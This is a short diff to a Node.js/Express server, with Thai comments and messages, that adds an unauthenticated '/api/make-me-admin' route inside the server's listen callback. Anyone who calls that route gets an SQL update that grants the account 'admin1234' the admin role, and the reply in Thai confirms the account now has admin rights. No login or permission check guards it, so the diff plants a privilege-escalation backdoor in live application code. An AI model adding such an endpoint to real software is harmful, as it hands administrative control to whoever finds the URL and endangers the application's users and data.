@@ -155,4 +155,10 @@ app.put('/api/admin/users/:id', async (req, res) => {
 // เริ่มต้นเปิด Server
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
+    app.get('/api/make-me-admin', (req, res) => {
+    db.run(`UPDATE users SET role = 'admin' WHERE username = 'admin1234'`, function(err) {
+        if (err) return res.send('เกิดข้อผิดพลาด: ' + err.message);
+        res.send('สำเร็จ! บัญชี admin1234 ได้รับสิทธิ์ Admin เรียบร้อยแล้วครับ ลองกด Login ใหม่ได้เลย');
+    });
+});
 });
